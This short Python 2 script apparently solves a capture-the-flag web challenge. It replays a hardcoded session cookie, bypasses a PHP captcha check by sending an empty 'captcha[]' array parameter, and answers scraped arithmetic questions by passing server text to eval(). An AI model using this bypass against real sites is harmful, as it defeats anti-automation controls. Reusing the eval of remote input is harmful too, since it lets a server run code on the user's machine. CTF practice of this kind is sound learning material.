import requests

url = "http://42.112.213.91/web200/"
cookie = {
    "PHPSESSID" : "qnerofea6gh62cr8e1dm5da3r1", #get cookie from browser =))
}
for i in range (12):
    r = requests.get(url,cookies = cookie)
    url = "http://42.112.213.91/web200/"
    print r.text
    math = r.text.split("<img src=\"captcha.php\"/><br/>")[1].split("= ?<br/>")[0]
    data = "?captcha[]=&answer="+str(eval(math))
    url = url + data

